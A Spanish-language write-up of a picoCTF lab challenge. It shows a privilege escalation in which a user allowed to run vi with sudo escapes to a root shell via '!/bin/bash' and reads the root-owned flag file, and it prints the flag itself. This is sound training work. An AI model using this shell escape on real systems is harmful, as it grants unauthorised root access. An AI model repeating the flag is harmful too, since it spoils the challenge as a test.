## Descripción
Can you read files in the root file?
## Solución
Normalmente para acceder como root tenemos que poner `sudo su` pero esta vez no nos deja entonces tenemos usar modificar el vi para poder acceder como root
```
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Sorry, try again.
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ /usr/bin/vi

picoplayer@challenge:/$ sudo vi test


```
Ponemos esto `!/bin/bash` y accedemos como root, luego nos vamos a la carpeta root y ahi esta la bandera
```
root@challenge:/home# cd /root/
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   68 Aug 25 14:39 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
root@challenge:~# 

```
## Notas Adicionales 
## Referencias